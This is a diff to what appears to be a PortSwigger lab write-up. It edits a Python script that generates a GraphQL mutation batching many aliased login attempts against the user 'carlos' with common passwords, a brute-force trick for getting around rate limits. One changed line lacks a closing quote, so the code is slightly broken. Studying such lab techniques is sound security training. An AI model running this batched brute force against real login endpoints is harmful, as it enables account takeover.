@@ -577,24 +577,25 @@ To get the password of carlos
 
 
 ```python
+passwords = [
+    "123456", "password", "12345678", "qwerty", "123456789", "football",
+    # ... paste the full list from https://portswigger.net/web-security/authentication/auth-lab-passwords here
+    # There are usually ~100 common passwords in the lab list
+]
 
-passwords = "123456,password,12345678,qwerty".split(',')
+print("{% raw %}")
+print("```graphql
+print("mutation BruteForceCarlos {")
 
-mutations = []
-for index, element in enumerate(passwords):
-    # Escape braces with backslash
-    mutation = (
-        f"bruteforce{index}: login(input: \\{{ password: \"{element}\", username: \"carlos\" \\}}) {{\n"
-        "    token\n"
-        "    success\n"
-        "}\n"
-    )
-    mutations.append(mutation)
+for i, pwd in enumerate(passwords, 1):
+    print(f"  attempt{i}: login(input: {{ username: \"carlos\", password: \"{pwd}\" }}) {{")
+    print("    success")
+    print("    token")
+    print("  }")
 
-# Wrap in triple backticks for Markdown + optional GraphQL syntax highlighting
-query = "```graphql\n" + "\n".join(mutations) + "\n```"
-print(query)
-
+print("}")
+print("```")
+print("{% endraw %}")
 ```
 
 
@@ -679,6 +680,7 @@ Store and deliver to victum and lab is solved
 
 
 ---
+
 
 
 
